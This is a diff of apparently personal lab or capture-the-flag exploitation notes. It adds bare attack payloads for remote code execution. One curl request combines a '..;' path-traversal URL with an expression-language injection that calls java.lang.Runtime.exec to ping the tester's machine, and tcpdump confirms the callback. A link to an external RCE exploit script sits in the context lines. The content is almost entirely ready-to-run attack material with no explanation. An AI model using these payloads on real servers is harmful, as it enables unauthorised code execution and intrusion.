@@ -34,6 +34,18 @@ http://10.129.96.116/maintenance/..;/login.jsp
 */
 ==========(5)======================================================================================================================
 https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/nexusRCE2.py
+
+/* or
+host:
+curl 'http://10.10.14.34/maintenance/..;/login.jsp/pwn$%7b-7+7%7d.xhtml'
+${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}
+
+curl 'http://10.10.14.34/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}.xhtml'
+
+//sudo tcpdump -ni tun0 icmp
+
+
+*/
 ==========(6)======================================================================================================================
 target:
 icacls .
